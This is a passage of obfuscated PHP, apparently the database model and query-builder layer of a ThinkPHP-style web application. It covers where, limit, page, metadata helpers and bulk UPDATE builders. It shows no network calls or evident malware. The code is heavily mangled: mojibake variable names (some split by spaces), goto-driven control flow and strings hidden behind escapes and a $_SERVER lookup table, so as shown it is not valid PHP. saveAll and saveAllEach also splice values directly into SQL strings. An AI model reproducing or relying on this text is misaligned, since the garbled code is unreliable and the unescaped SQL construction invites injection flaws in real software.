$Fø½ßÇŒ™‹[$bÚÉÁöÒ±×[254]], $Fø½ßÇŒ™‹[$bÚÉÁöÒ±×[255]], $Fø½ßÇŒ™‹[$bÚÉÁöÒ±×[252]]); return $Fø½ßÇŒ™‹; } return !1; } public function data($EÌ¢ˆß£¶— = '') { $B‹Ú¡×õ½ =& $_SERVER[¢Í]; if ($B‹Ú¡×õ½[33] === $EÌ¢ˆß£¶— && !empty($this->data)) { return $this->data; } if (is_object($EÌ¢ˆß£¶—)) { $EÌ¢ˆß£¶— = get_object_vars($EÌ¢ˆß£¶—); } elseif (is_string($EÌ¢ˆß£¶—)) { parse_str($EÌ¢ˆß£¶—, $EÌ¢ˆß£¶—); } elseif (!is_array($EÌ¢ˆß£¶—)) { think_exception(think_lang($B‹Ú¡×õ½[274])); } $this->data = $EÌ¢ˆß£¶—; return $this; } public function join($fÊÏŞóæÛ«) { $BÁ‡ãšõÏÒ =& $_SERVER[¢Í]; if (is_array($fÊÏŞóæÛ«)) { $this->options[$BÁ‡ãšõÏÒ[285]] = $fÊÏŞóæÛ«; } elseif (!empty($fÊÏŞóæÛ«)) { $this->options[$BÁ‡ãšõÏÒ[285]][] = $fÊÏŞóæÛ«; } return $this; } public function union($AÇÚ¯ËÆÔ«, $e¹È…åñ‹¡ = false) { goto AÉí±¡Œ; AÉí±¡Œ: $eğùĞ×†Ş =& $_SERVER[¢Í]; if (empty($AÇÚ¯ËÆÔ«)) { return $this; } if ($e¹È…åñ‹¡) { $this->options[$eğùĞ×†Ş[350]][$eğùĞ×†Ş[351]] = !0; } goto a»… Úš°; bóˆÖ÷›ï: return $this; goto a„Ğ’ù¢¬Ã; a»… Úš°: if (is_object($AÇÚ¯ËÆÔ«)) { $AÇÚ¯ËÆÔ« = get_object_vars($AÇÚ¯ËÆÔ«); } if (is_string($AÇÚ¯ËÆÔ«)) { $b¨ïçô÷Ã = $AÇÚ¯ËÆÔ«; } elseif (is_array($AÇÚ¯ËÆÔ«)) { if (isset($AÇÚ¯ËÆÔ«[0])) { $this->options[$eğùĞ×†Ş[350]] = array_merge($this->options[$eğùĞ×†Ş[350]], $AÇÚ¯ËÆÔ«); return $this; } else { $b¨ïçô÷Ã = $AÇÚ¯ËÆÔ«; } } else { think_exception(think_lang($eğùĞ×†Ş[274])); } $this->options[$eğùĞ×†Ş[350]][] = $b¨ïçô÷Ã; goto bóˆÖ÷›ï; a„Ğ’ù¢¬Ã: } public function cache($Aàä¶‰Õì· = true, $eºÃÎ™²–ğ = null, $C‚ƒ«¨Ì¥ = '') { $a ÑõÑõ =& $_SERVER[¢Í]; if (!1 !== $Aàä¶‰Õì·) { $this->options[$a ÑõÑõ[352]] = array($a ÑõÑõ[99] => $Aàä¶‰Õì·, $a ÑõÑõ[342] => $eºÃÎ™²–ğ, $a ÑõÑõ[29] => $C‚ƒ«¨Ì¥); } return $this; } public function field($EªÔ‹µàÅ, $b»Ä‹êéÕç = false) { $Bƒ °éÓ³¤ =& $_SERVER[¢Í]; if (!0 === $EªÔ‹µàÅ) { $cŠœ´ÛÁáš = $this->getDbFields(); $EªÔ‹µàÅ = $cŠœ´ÛÁáš ? $cŠœ´ÛÁáš : $Bƒ °éÓ³¤[190]; } elseif ($b»Ä‹êéÕç) { if (is_string($EªÔ‹µàÅ)) { $EªÔ‹µàÅ = explode($Bƒ °éÓ³¤[47], $EªÔ‹µàÅ); } $cŠœ´ÛÁáš = $this->getDbFields(); $EªÔ‹µàÅ = $cŠœ´ÛÁáš ? array_diff($cŠœ´ÛÁáš, $EªÔ‹µàÅ) : $EªÔ‹µàÅ; } $this->options[$Bƒ °éÓ³¤[276]] = $EªÔ‹µàÅ; return $this; } public function scope($EùŠùñÀ¢‡ = '', $b«–Å•œã‰ = NULL) { $fùƒµ¨§ëø =& $_SERVER[¢Í]; if ($fùƒµ¨§ëø[33] === $EùŠùñÀ¢‡) { if (isset($this->_scope[$fùƒµ¨§ëø[34]])) { $fßÕ¥êŒ“ö = $this->_scope[$fùƒµ¨§ëø[34]]; } else { return $this; } } elseif (is_string($EùŠùñÀ¢‡)) { $F‘‹’…¬Å = explode($fùƒµ¨§ëø[47], $EùŠùñÀ¢‡); $fßÕ¥êŒ“ö = array(); foreach ($F‘‹’…¬Å as $C·Ì¼øÇÈ) { if (!isset($this->_scope[$C·Ì¼øÇÈ])) { continue; } $fßÕ¥êŒ“ö = array_merge($fßÕ¥êŒ“ö, $this->_scope[$C·Ì¼øÇÈ]); } if (!empty($b«–Å•œã‰) && is_array($b«–Å•œã‰)) { $fßÕ¥êŒ“ö = array_merge($fßÕ¥êŒ“ö, $b«–Å•œã‰); } } elseif (is_array($EùŠùñÀ¢‡)) { $fßÕ¥êŒ“ö = $EùŠùñÀ¢‡; } if (is_array($fßÕ¥êŒ“ö) && !empty($fßÕ¥êŒ“ö)) { $this->options = array_merge($this->options, array_change_key_case($fßÕ¥êŒ“ö)); } return $this; } public function where($BòŠéÇ¡Êè, $BŠ’šÖÑˆÜ = null) { $aé·Ğˆ¤š =& $_SERVER[¢Í]; if (!is_null($BŠ’šÖÑˆÜ) && is_string($BòŠéÇ¡Êè)) { if (!is_array($BŠ’šÖÑˆÜ)) { $BŠ’šÖÑˆÜ = func_get_args(); array_shift($BŠ’šÖÑˆÜ); } $BŠ’šÖÑˆÜ = array_map(array($this->db, $aé·Ğˆ¤š[346]), $BŠ’šÖÑˆÜ); $BòŠéÇ¡Êè = vsprintf($BòŠéÇ¡Êè, $BŠ’šÖÑˆÜ); } elseif (is_object($BòŠéÇ¡Êè)) { $BòŠéÇ¡Êè = get_object_vars($BòŠéÇ¡Êè); } elseif (is_array($BòŠéÇ¡Êè)) { foreach ($BòŠéÇ¡Êè as $CØø…õ±“ˆ => $b˜ŞÛ¯Û‘¯) { if ((is_numeric($CØø…õ±“ˆ) || !$CØø…õ±“ˆ) && is_string($b˜ŞÛ¯Û‘¯)) { if (strpos($b˜ŞÛ¯Û‘¯, $aé·Ğˆ¤š[353]) === 0) { continue; } think_trace($aé·Ğˆ¤š[354], $aé·Ğˆ¤š[33], $aé·Ğˆ¤š[46]); die; } } } if (is_string($BòŠéÇ¡Êè) && $aé·Ğˆ¤š[33] != $BòŠéÇ¡Êè) { $B£áéùƒÀß = array(); $B£áéùƒÀß[$aé·Ğˆ¤š[355]] = $BòŠéÇ¡Êè; $BòŠéÇ¡Êè = $B£áéùƒÀß; } if (isset($this->options[$aé·Ğˆ¤š[278]])) { $this->options[$aé·Ğˆ¤š[278]] = array_merge($this->options[$aé·Ğˆ¤š[278]], $BòŠéÇ¡Êè); } else { $this->options[$aé·Ğˆ¤š[278]] = $BòŠéÇ¡Êè; } return $this; } public function limit($F¾êÃÔ­ãÆ, $f‡ê¾İÑ° = null) { $d©Ø¼¥¤¾™ =& $_SERVER[¢Í]; $this->options[$d©Ø¼¥¤¾™[295]] = is_null($f‡ê¾İÑ°) ? $F¾êÃÔ­ãÆ : $F¾êÃÔ­ãÆ . $d©Ø¼¥¤¾™[47] . $f‡ê¾İÑ°; return $this; } public function page($c²ÉÜª³î„, $fâ¦îì“º = null) { $eªé’¢Æà© =& $_SERVER[¢Í]; $this->options[$eªé’¢Æà©[356]] = is_null($fâ¦îì“º) ? $c²ÉÜª³î„ : $c²ÉÜª³î„ . $eªé’¢Æà©[47] . $fâ¦îì“º; return $this; } public function comment($cŒè°Ô») { $this->options[$_SERVER[¢Í][357]] = $cŒè°Ô»; return $this; } public function setProperty($e®¿Í¨‚šÛ, $e³ãÛÛ‚ä…) { if (property_exists($this, $e®¿Í¨‚šÛ)) { $this->{$e®¿Í¨‚šÛ} = $e³ãÛÛ‚ä…; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\157\144\151\x66\x79\124\x69\x6d\x65", "\164\x69\155\145", "\151\156\163\145\162\164\x2c\x75\160\x64\141\x74\145", "\x66\x75\x6e\x63\x74\151\x6f\156"), array("\143\162\145\141\164\145\124\x69\155\x65", "\x74\x69\155\145", "\x69\156\163\145\x72\164", "\146\x75\156\x63\x74\x69\157\156")); public function setDataAuto($aô§‚ƒ‡Ä) { $this->dataAuto = $aô§‚ƒ‡Ä; } public function __construct($cÔ‘Ï‹Å¶ = '', $E¯ëİ‚í½Ú = '', $eˆÈµŸËÚ = '') { parent::__construct($cÔ‘Ï‹Å¶, $E¯ëİ‚í½Ú, $eˆÈµŸËÚ); } public static function textEncode($Bå÷›Ã˜‚) { if (!$Bå÷›Ã˜‚) { return $Bå÷›Ã˜‚; } $fÄçÛß·³¥ = json_encode($Bå÷›Ã˜‚); $fÄçÛß·³¥ = preg_replace_callback($_SERVER[¢Í][358], function ($c†½§¯»Ëñ) { return addslashes($c†½§¯»Ëñ[0]); }, $fÄçÛß·³¥); return json_decode($fÄçÛß·³¥); } public static function textDecode($dôñ±å—è±) { $C¾˜æŸÕİ =& $_SERVER[¢Í]; $B¥ÍÍ¦ù‹À = json_encode($dôñ±å—è±); $B¥ÍÍ¦ù‹À = preg_replace_callback($C¾˜æŸÕİ[359], function ($dÂÂË’½Áğ) { return $_SERVER[¢Í][103]; }, $B¥ÍÍ¦ù‹À); return json_decode($B¥ÍÍ¦ù‹À); } protected $tableMeta = array(); protected function _beforeInsert(&$BßÖ½…ÉØë, $BŞÓ„õ˜»ã) { $Eê²æË† =& $_SERVER[¢Í]; if (!$this->checkDataAutoHas($Eê²æË†[360])) { return; } $this->dataBeforeFilter($BßÖ½…ÉØë, $Eê²æË†[360]); } protected function _beforeUpdate(&$cŠÈ™’°Ü, $BÖÓŸíªÊÓ) { $C½¹Š§ˆÃ¨ =& $_SERVER[¢Í]; if (!$this->checkDataAutoHas($C½¹Š§ˆÃ¨[361])) { return; } $this->dataBeforeFilter($cŠÈ™’°Ü, $C½¹Š§ˆÃ¨[361]); } protected function _afterSelect(&$e½Ñø§¯£¯, $E×§‹ÈõÌ¶) { if (!is_array($e½Ñø§¯£¯)) { return; } if (!$this->checkDataAutoHas($_SERVER[¢Í][362])) { return; } foreach ($e½Ñø§¯£¯ as &$cùÙÎ“’É§) { $this->dataAfterFilter($cùÙÎ“’É§); } unset($cùÙÎ“’É§); } protected function _afterFind(&$f¡ËÚ†¥‹®, $d¸Ï»“­íø) { if (!is_array($f¡ËÚ†¥‹®)) { return; } if (!$this->checkDataAutoHas($_SERVER[¢Í][362])) { return; } $this->dataAfterFilter($f¡ËÚ†¥‹®); } public function setAutoIncrement($f­‡Âª¯Á¯) { $A¨¹†ã¡‰ = array($this->getPk() => $f­‡Âª¯Á¯); $E‘§ÕÄÅ¤Ú = $this->data($A¨¹†ã¡‰)->add(); if ($E‘§ÕÄÅ¤Ú) { $this->delete($E‘§ÕÄÅ¤Ú); } } public function getAutoIncrement() { $aò•”×Ñí = $this->getTableName(); $fĞ°’ˆ…™Š = $this->max($this->getPk()); $dšè¬‘ã–Ê = $this->query("\163\x68\157\x77\x20\164\x61\142\154\x65\x20\163\x74\141\x74\x75\163\40\167\150\145\x72\x65\x20\x4e\141\x6d\x65\75\x27{$aò•”×Ñí}\47"); $D¥™Ä„ø = $dšè¬‘ã–Ê[0][$_SERVER[¢Í][363]]; $E×¯İ˜Ù¦ = max($fĞ°’ˆ…™Š, $D¥™Ä„ø); return $E×¯İ˜Ù¦; } protected function _callBefore($cæ¬í†õÑ“, $a¨ÈõÓÃ¢) { return $this->cacheCallCheck($cæ¬í†õÑ“, $a¨ÈõÓÃ¢, !1); } protected function _callAfter($F­ê÷˜º¡, $dôõáÛîïÃ) { return $this->cacheCallCheck($F­ê÷˜º¡, $dôõáÛîïÃ, !0); } protected function cacheFunctionAlias($F÷ËÛğµÔÄ) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($C¨‡ÆÑ Õ, $AÏëÄ³¿÷¾, $BâªÈ¦à„Œ = false) { $Câİ¥ôÔé¢ = $this->cacheFunctionAlias($AÏëÄ³¿÷¾); if (!$Câİ¥ôÔé¢) { return; } foreach ($Câİ¥ôÔé¢ as $CÁï˜Ÿ¥®° => $D§´Ì¹Å¡–) { $dæñäø…ÖÍ = $D§´Ì¹Å¡–[0]; $Bô¯‚Úù”Ø = explode($_SERVER[¢Í][47], $D§´Ì¹Å¡–[1]); if ($C¨‡ÆÑ Õ == $CÁï˜Ÿ¥®°) { return $this->cacheFunctionGet($CÁï˜Ÿ¥®°, $dæñäø…ÖÍ); } if ($BâªÈ¦à„Œ && in_array($C¨‡ÆÑ Õ, $Bô¯‚Úù”Ø)) { $this->cacheFunctionClear($CÁï˜Ÿ¥®°, $dæñäø…ÖÍ); } } } public function cacheFunctionGet($b±³Ó²¿Å‰, $dõçêˆõ²Ü) { $Fôæˆ§ªä† = $this->cacheKeyMake($b±³Ó²¿Å‰, $dõçêˆõ²Ü); $bµ³œ–¿ = Cache::get($Fôæˆ§ªä†); if (!is_array($bµ³œ–¿)) { $bµ³œ–¿ = call_user_func_array(array($this, $b±³Ó²¿Å‰), array($dõçêˆõ²Ü, !0)); Cache::set($Fôæˆ§ªä†, $bµ³œ–¿); } return $bµ³œ–¿; } public function cacheFunctionClear($d¸Ÿ„áã«è, $AâË·•»‚É) { $eˆ„†ö³°å = $AâË·•»‚É; if (!is_array($AâË·•»‚É)) { $eˆ„†ö³°å = array($AâË·•»‚É); } foreach ($eˆ„†ö³°å as $aæëÂŞÌ‡) { $F©Â—‹Œ¼ = $this->cacheKeyMake($d¸Ÿ„áã«è, $aæëÂŞÌ‡); Cache::remove($F©Â—‹Œ¼); } } private function cacheKeyMake($CùÑö÷Ú„, $C¢‹Ø‡¯ø) { $F±Ì‘‘­ë =& $_SERVER[¢Í]; return get_class($this) . $F±Ì‘‘­ë[80] . $CùÑö÷Ú„ . $F±Ì‘‘­ë[364] . $C¢‹Ø‡¯ø; } protected function selectPage($F©Õ…™„ˆ = 200, $E‹ìÌ©ªùŞ = 1) { goto cƒ­Š£Ùå—; E¸ÖŸÊÚ‹§: $Eñ‹íó­ÉÔ = $fÔêñÔ‘Áå; $Eñ‹íó­ÉÔ[$d”ô¹£ä[366]] = array(); $this->optionsValue($Eñ‹íó­ÉÔ); goto fÏƒªÄÚ¼Ü; dùº½˜åòº: $c£§×İÈÄÎ = ceil($f“äñì¸”¤ / $F©Õ…™„ˆ); $E‹ìÌ©ªùŞ = intval(isset($in[$d”ô¹£ä[356]]) ? $in[$d”ô¹£ä[356]] : $E‹ìÌ©ªùŞ); $E‹ìÌ©ªùŞ = $E‹ìÌ©ªùŞ <= 1 ? 1 : ($E‹ìÌ©ªùŞ >= $c£§×İÈÄÎ ? $c£§×İÈÄÎ : $E‹ìÌ©ªùŞ); goto F±ëÓ®†äŠ; F±ëÓ®†äŠ: $this->optionsValue($fÔêñÔ‘Áå); $F‘†ŸÙª‡Î = $this->page($E‹ìÌ©ªùŞ, $F©Õ…™„ˆ)->select(); $F‘†ŸÙª‡Î = is_array($F‘†ŸÙª‡Î) ? $F‘†ŸÙª‡Î : array(); goto B‹Ï×Äó¶…; aê•˜ÂÆ¦í: $C°šôÃ‡¢À = 4000; $F©Õ…™„ˆ = isset($in[$d”ô¹£ä[365]]) ? $in[$d”ô¹£ä[365]] : $F©Õ…™„ˆ; if ($F©Õ…™„ˆ === -1) { unset($in[$d”ô¹£ä[365]]); $C°šôÃ‡¢À = 100000000; $F©Õ…™„ˆ = $C°šôÃ‡¢À; } goto E¸ÖŸÊÚ‹§; B‹Ï×Äó¶…: if ($c£§×İÈÄÎ == 1) { $f“äñì¸”¤ = count($F‘†ŸÙª‡Î); } $Bó’›«Ê…† = array($d”ô¹£ä[367] => array($d”ô¹£ä[368] => $f“äñì¸”¤, $d”ô¹£ä[365] => $F©Õ…™„ˆ, $d”ô¹£ä[356] => $E‹ìÌ©ªùŞ, $d”ô¹£ä[369] => $c£§×İÈÄÎ), $d”ô¹£ä[370] => $F‘†ŸÙª‡Î ? $F‘†ŸÙª‡Î : array()); return $Bó’›«Ê…†; goto Bá«½ôÆÔ†; fÏƒªÄÚ¼Ü: $f“äñì¸”¤ = intval($this->count()); $F©Õ…™„ˆ = intval($F©Õ…™„ˆ); $F©Õ…™„ˆ = $F©Õ…™„ˆ <= 5 ? 5 : ($F©Õ…™„ˆ >= $C°šôÃ‡¢À ? $C°šôÃ‡¢À : $F©Õ…™„ˆ); goto dùº½˜åòº; cƒ­Š£Ùå—: $d”ô¹£ä =& $_SERVER[¢Í]; global $in; $fÔêñÔ‘Áå = $this->optionsValue(); goto aê•˜ÂÆ¦í; Bá«½ôÆÔ†: } protected function checkLength($C„¦õÌñíà, $C…¨‰¿ŞÜ… = 0, $EÈ¢Ü³”½ = '') { $DÏÛ¸¦×ÁÌ =& $_SERVER[¢Í]; $C…¨‰¿ŞÜ… = $C…¨‰¿ŞÜ… ? $C…¨‰¿ŞÜ… : 65536; if (!$C„¦õÌñíà || strlen($C„¦õÌñíà) < $C…¨‰¿ŞÜ…) { return; } $EÈ¢Ü³”½ = $EÈ¢Ü³”½ ? $EÈ¢Ü³”½ . $DÏÛ¸¦×ÁÌ[77] : $DÏÛ¸¦×ÁÌ[33]; show_json($EÈ¢Ü³”½ . LNG($DÏÛ¸¦×ÁÌ[371]) . "\50{$C…¨‰¿ŞÜ…}\51", !1); } protected function metaSet($a…”®Î¤“, $BôÕ‚è¬ = null, $fóäŠ±ëÆô = null) { goto b¡¤¤÷àÜŠ; B²Á©Õ¿‰: $eÜ‹´Ñô ’->where(array($CÎ‚ÒºËà¸ => $a…”®Î¤“))->addAll($c·ñ¤Úòˆ¾, array(), !0); return !0; goto f§Èœ½ƒè‘; a†‘ùå»áˆ: if (is_null($BôÕ‚è¬)) { return $eÜ‹´Ñô ’->where(array($CÎ‚ÒºËà¸ => $a…”®Î¤“))->delete(); } if (is_null($fóäŠ±ëÆô) && is_string($BôÕ‚è¬)) { return $eÜ‹´Ñô ’->where($b¨„½­â¨)->delete(); } $fÀ‘ø¯ä¹¡ = is_array($BôÕ‚è¬) ? $BôÕ‚è¬ : array(); goto B“”¼ˆšš’; CÆƒÖíñˆ—: $b…îõŒ¢¥ = $this->tableMeta[$béâÈìöœ…[373]]; $eÜ‹´Ñô ’ = Model($b…îõŒ¢¥); $b¨„½­â¨ = array($CÎ‚ÒºËà¸ => $a…”®Î¤“, $béâÈìöœ…[374] => $BôÕ‚è¬); goto a†‘ùå»áˆ; B“”¼ˆšš’: if (is_string($BôÕ‚è¬)) { $fÀ‘ø¯ä¹¡[$BôÕ‚è¬] = $fóäŠ±ëÆô; } $c·ñ¤Úòˆ¾ = array(); foreach ($fÀ‘ø¯ä¹¡ as $d†ôÀâ¹Á© => $cŠëæ›ÚîÎ) { $this->checkLength($cŠëæ›ÚîÎ, !1, $b…îõŒ¢¥ . $béâÈìöœ…[4] . $d†ôÀâ¹Á©); $c·ñ¤Úòˆ¾[] = array($CÎ‚ÒºËà¸ => $a…”®Î¤“, $béâÈìöœ…[99] => $d†ôÀâ¹Á©, $béâÈìöœ…[375] => $cŠëæ›ÚîÎ); } goto B²Á©Õ¿‰; b¡¤¤÷àÜŠ: $béâÈìöœ… =& $_SERVER[¢Í]; if (!$this->tableMeta || !$a…”®Î¤“) { return !1; } $CÎ‚ÒºËà¸ = $this->tableMeta[$béâÈìöœ…[372]]; goto CÆƒÖíñˆ—; f§Èœ½ƒè‘: } public function metaGet($c„™®ÈĞ‡, $F‘ìÇ¢æ = false) { goto DíÇåÀ–¼£; BˆÑÖ¸İµ™: $cšøİÏ”õ· = $Bâñ¤‘ëĞ×->field($C¿Ââ¥øí[376])->where($D–’ÑóÍ²î)->select(); $cšøİÏ”õ· = array_to_keyvalue($cšøİÏ”õ·, $C¿Ââ¥øí[99], $C¿Ââ¥øí[375]); return $cšøİÏ”õ·; goto d‡ŸÒìºµ›; DíÇåÀ–¼£: $C¿Ââ¥øí =& $_SERVER[¢Í]; if (!$this->tableMeta) { return array(); } $FÙæ¶£Ö¶° = $this->tableMeta[$C¿Ââ¥øí[372]]; goto AãëÇ£Å‘‘; AãëÇ£Å‘‘: $Bâñ¤‘ëĞ× = Model($this->tableMeta[$C¿Ââ¥øí[373]]); if ($F‘ìÇ¢æ) { $D–’ÑóÍ²î = array($FÙæ¶£Ö¶° => $c„™®ÈĞ‡, $C¿Ââ¥øí[99] => $F‘ìÇ¢æ); return $Bâñ¤‘ëĞ×->where($D–’ÑóÍ²î)->getField($C¿Ââ¥øí[375]); } $D–’ÑóÍ²î = array($FÙæ¶£Ö¶° => $c„™®ÈĞ‡); goto BˆÑÖ¸İµ™; d‡ŸÒìºµ›: } private function checkDataAutoHas($ešÃ»·ÁÛ) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $D‹è×£ˆ¸ ) { if (in_array($ešÃ»·ÁÛ, explode($_SERVER[¢Í][47], $D‹è×£ˆ¸ [2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$DÅŒæÙùÔ, $B‡Áœ·áÁ) { $e«¨ÌÇ­Ìˆ =& $_SERVER[¢Í]; foreach ($this->dataAuto as $C‹À¤…İø„) { $F¸­ä«ğç = $C‹À¤…İø„[0]; if (!in_array($B‡Áœ·áÁ, explode($e«¨ÌÇ­Ìˆ[47], $C‹À¤…İø„[2]))) { continue; } switch (trim($C‹À¤…İø„[3])) { case $e«¨ÌÇ­Ìˆ[324]: case $e«¨ÌÇ­Ìˆ[325]: $a¥³Ò¹æÂ÷ = $C‹À¤…İø„[1]; $cËöí‚¬ö‡ = isset($C‹À¤…İø„[4]) ? (array) $C‹À¤…İø„[4] : array(); if ($a¥³Ò¹æÂ÷ == $e«¨ÌÇ­Ìˆ[203] && array_key_exists($F¸­ä«ğç, $DÅŒæÙùÔ)) { if (!$DÅŒæÙùÔ[$F¸­ä«ğç]) { unset($DÅŒæÙùÔ[$F¸­ä«ğç]); } break; } if (isset($DÅŒæÙùÔ[$F¸­ä«ğç])) { array_unshift($cËöí‚¬ö‡, $DÅŒæÙùÔ[$F¸­ä«ğç]); } if ($e«¨ÌÇ­Ìˆ[324] == $C‹À¤…İø„[3]) { $DÅŒæÙùÔ[$F¸­ä«ğç] = call_user_func_array($a¥³Ò¹æÂ÷, $cËöí‚¬ö‡); } else { $DÅŒæÙùÔ[$F¸­ä«ğç] = call_user_func_array(array(&$this, $a¥³Ò¹æÂ÷), $cËöí‚¬ö‡); } break; case $e«¨ÌÇ­Ìˆ[276]: $DÅŒæÙùÔ[$F¸­ä«ğç] = $DÅŒæÙùÔ[$C‹À¤…İø„[1]]; break; case $e«¨ÌÇ­Ìˆ[297]: if (isset($DÅŒæÙùÔ[$F¸­ä«ğç]) && !is_string($DÅŒæÙùÔ[$F¸­ä«ğç])) { $DÅŒæÙùÔ[$F¸­ä«ğç] = json_encode_force($DÅŒæÙùÔ[$F¸­ä«ğç]); } break; case $e«¨ÌÇ­Ìˆ[326]: if ($DÅŒæÙùÔ[$F¸­ä«ğç] === $e«¨ÌÇ­Ìˆ[33]) { unset($DÅŒæÙùÔ[$F¸­ä«ğç]); } break; case $e«¨ÌÇ­Ìˆ[327]: $DÅŒæÙùÔ[$F¸­ä«ğç] = $C‹À¤…İø„[1]; default: break; } } if ($B‡Áœ·áÁ == $e«¨ÌÇ­Ìˆ[360]) { $dÖË”Ú ‡‰ = strtolower($this->db->getDbType()); if (strpos($dÖË”Ú ‡‰, $e«¨ÌÇ­Ìˆ[9]) !== 0) { return; } $f·êˆµ„ôÅ = $this->field(!0)->fields; $c™£¯‘“³ = $f·êˆµ„ôÅ[$e«¨ÌÇ­Ìˆ[255]]; if (isset($f·êˆµ„ôÅ[$e«¨ÌÇ­Ìˆ[254]])) { unset($c™£¯‘“³[$f·êˆµ„ôÅ[$e«¨ÌÇ­Ìˆ[254]]]); } foreach ($c™£¯‘“³ as $EÄ©óŞÏóÄ => $B‡Áœ·áÁ) { if (!isset($DÅŒæÙùÔ[$EÄ©óŞÏóÄ])) { $DÅŒæÙùÔ[$EÄ©óŞÏóÄ] = $e«¨ÌÇ­Ìˆ[33]; } } } } private function dataAfterFilter(&$få‘ªĞºËË) { $DÜ¡«­‡ø =& $_SERVER[¢Í]; foreach ($this->dataAuto as $BÊ°‘ÄË‰Û) { $fÀÌäåÎÒÂ = $BÊ°‘ÄË‰Û[0]; if (!in_array($DÜ¡«­‡ø[362], explode($DÜ¡«­‡ø[47], $BÊ°‘ÄË‰Û[2]))) { continue; } if (!isset($få‘ªĞºËË[$fÀÌäåÎÒÂ])) { continue; } switch (trim($BÊ°‘ÄË‰Û[3])) { case $DÜ¡«­‡ø[324]: case $DÜ¡«­‡ø[325]: $c§‡Şá¨¿– = isset($BÊ°‘ÄË‰Û[4]) ? (array) $BÊ°‘ÄË‰Û[4] : array(); array_unshift($c§‡Şá¨¿–, $få‘ªĞºËË[$fÀÌäåÎÒÂ]); if ($DÜ¡«­‡ø[324] == $BÊ°‘ÄË‰Û[3]) { $få‘ªĞºËË[$fÀÌäåÎÒÂ] = call_user_func_array($BÊ°‘ÄË‰Û[1], $c§‡Şá¨¿–); } else { $få‘ªĞºËË[$fÀÌäåÎÒÂ] = call_user_func_array(array(&$this, $BÊ°‘ÄË‰Û[1]), $c§‡Şá¨¿–); } break; case $DÜ¡«­‡ø[276]: $få‘ªĞºËË[$fÀÌäåÎÒÂ] = $få‘ªĞºËË[$BÊ°‘ÄË‰Û[1]]; break; case $DÜ¡«­‡ø[297]: $F…Ììã°œï = $få‘ªĞºËË[$fÀÌäåÎÒÂ]; $få‘ªĞºËË[$fÀÌäåÎÒÂ] = json_decode($F…Ììã°œï, !0); if (is_null($få‘ªĞºËË[$fÀÌäåÎÒÂ])) { $få‘ªĞºËË[$fÀÌäåÎÒÂ] = $F…Ììã°œï; } break; case $DÜ¡«­‡ø[326]: if ($få‘ªĞºËË[$fÀÌäåÎÒÂ] === $DÜ¡«­‡ø[33]) { unset($få‘ªĞºËË[$fÀÌäåÎÒÂ]); } break; case $DÜ¡«­‡ø[327]: $få‘ªĞºËË[$fÀÌäåÎÒÂ] = $BÊ°‘ÄË‰Û[1]; default: break; } } } public function saveAll($B¼İ¢×Âì) { goto cë÷—áÌ‹—; B‘†ÜˆÆù¬: $B¼İ¢×Âì = is_array($B¼İ¢×Âì) ? $B¼İ¢×Âì : array(); $AË—àä´¦ = $Fø«’å¢¹Ò[377]; $Fœ¥íÉºëŞ = 0; goto DØ÷†‰²‰°; a¹â÷‡Ä: $this->chunkEventSet(); goto Fô…ÑƒØïÊ; cë÷—áÌ‹—: $Fø«’å¢¹Ò =& $_SERVER[¢Í]; $EìŞèˆ£òŞ = $this->tablePrefix . $this->tableName; $b©“ã¿ĞÊÃ = self::SQL_WHERE_IN_CHUNK; goto B‘†ÜˆÆù¬; DØ÷†‰²‰°: $fòÛó£åÄ = array(); $f·ì¥å‚ƒŠ = count($B¼İ¢×Âì); for ($A°æ‘Şİ¡ = 0; $A°æ‘Şİ¡ < $f·ì¥å‚ƒŠ; $A°æ‘Şİ¡++) { $EÍØ×—»¦“ = $B¼İ¢×Âì[$A°æ‘Şİ¡]; if (!is_array($EÍØ×—»¦“) || count($EÍØ×—»¦“) != 4) { continue; } $fâ­É±»À® = "\125\120\104\101\x54\x45\x20\x60{$EìŞèˆ£òŞ}\140\x20\x53\105\x54\x20{$EÍØ×—»¦“[2]}\40\x3d\x20\x43\101\123\x45\40{$EÍØ×—»¦“[0]}\40\12"; if ($Fœ¥íÉºëŞ == 0) { $AË—àä´¦ = $fâ­É±»À®; } $fòÛó£åÄ[] = $Fø«’å¢¹Ò[123] . $EÍØ×—»¦“[1] . $Fø«’å¢¹Ò[123]; $Fœ¥íÉºëŞ++; $AË—àä´¦ .= "\40\x57\110\x45\x4e\x20\47{$EÍØ×—»¦“[1]}\x27\x20\x54\110\105\116\40\x27{$EÍØ×—»¦“[3]}\x27\40\xa"; if ($Fœ¥íÉºëŞ == $b©“ã¿ĞÊÃ || $A°æ‘Şİ¡ == $f·ì¥å‚ƒŠ - 1) { goto aØâ¯÷™…ò; Dé”ê”³¯ˆ: $fòÛó£åÄ = array(); goto dŠÕ§ë½½; aØâ¯÷™…ò: $B‰ØÖÆ’ = implode($Fø«’å¢¹Ò[47], $fòÛó£åÄ); $AË—àä´¦ .= "\x20\x45\116\x44\40\40\127\x48\105\122\105\40{$EÍØ×—»¦“[0]}\x20\111\x4e\x20\50{$B‰ØÖÆ’}\51\40"; $this->execute($AË—àä´¦); goto E¿ÁæÜÎ°ª; E¿ÁæÜÎ°ª: $Fœ¥íÉºëŞ = 0; $AË—àä´¦ = $fâ­É±»À®; $this->chunkEventCheck(count($fòÛó£åÄ)); goto Dé”ê”³¯ˆ; dŠÕ§ë½½: } } goto a¹â÷‡Ä; Fô…ÑƒØïÊ: } public function saveAllEach($bìœì„ÏŠ‚) { $FÓ•µµ ô² =& $_SERVER[¢Í]; $aĞ¢ËæŞˆ¾ = $this->tablePrefix . $this->tableName; foreach ($bìœì„ÏŠ‚ as $AÆ‰ñÃÚğË) { if (!is_array($AÆ‰ñÃÚğË) || count($AÆ‰ñÃÚğË) != 4) { continue; } $bÏ«·¦ÕÕÔ = $AÆ‰ñÃÚğË[0] . $FÓ•µµ ô²[378] . $AÆ‰ñÃÚğË[1] . $FÓ•µµ ô²[123]; $B•ªÜ³äŞì = $AÆ‰ñÃÚğË[2] . $FÓ•µµ ô²[378] . $AÆ‰ñÃÚğË[3] . $FÓ•µµ ô²[123]; $D®«ãÈ§ñÃ = "\x75\x70\144\x61\164\x65\x20{$aĞ¢ËæŞˆ¾}\x20\x73\145\x74\x20{$B•ªÜ³äŞì}\40\x77\x68\x65\x72\145\x20{$bÏ«·¦ÕÕÔ}\x3b"; 